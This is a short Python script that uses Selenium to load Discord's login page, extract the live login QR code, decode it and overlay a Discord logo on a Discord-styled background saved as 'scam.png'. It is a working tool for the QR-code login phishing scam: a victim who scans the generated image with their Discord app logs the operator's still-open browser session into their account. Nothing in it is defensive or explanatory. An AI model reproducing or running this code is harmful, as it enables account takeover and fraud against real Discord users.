from PIL import Image, ImageDraw
from bs4 import BeautifulSoup
from selenium.webdriver.chrome.service import Service
from selenium import webdriver
import base64
import time
import os

def logo_qr():
    im1 = Image.open('qr_code.png', 'r')
    im2 = Image.open('discord_logo.png', 'r')
    im2_w, im2_h = im2.size
    im1.paste(im2, (60, 55))
    im1.save('final_qr.png', quality=95)


def rectangle(output_path):
    image = Image.new("RGBA", (400, 400), "#00000000")
    draw = ImageDraw.Draw(image)
    draw.rounded_rectangle((0, 00, 400, 400), fill="#36393fFF",
                           width=3, radius=15)
    image.save(output_path)

def main():
    options = webdriver.ChromeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.add_experimental_option('detach', True)
    s = Service(executable_path='chromedriver.exe')
    
    driver = webdriver.Chrome(options=options, service=s)
    driver.get('https://discord.com/login')
    time.sleep(5)
    page_source = driver.page_source
    soup = BeautifulSoup(page_source, features='lxml')
    
    div = soup.find('div', {'class': 'qrCode-2R7t9S'})
    qr_code = div.find('img')['src']
    file = os.path.join(os.getcwd(), 'qr_code.png')
    img_data =  base64.b64decode(qr_code.replace('data:image/png;base64,', ''))
    with open(file,'wb') as handler:
        handler.write(img_data)
    discord_login = driver.current_url
    logo_qr()

        
rectangle('scam.png')
main()
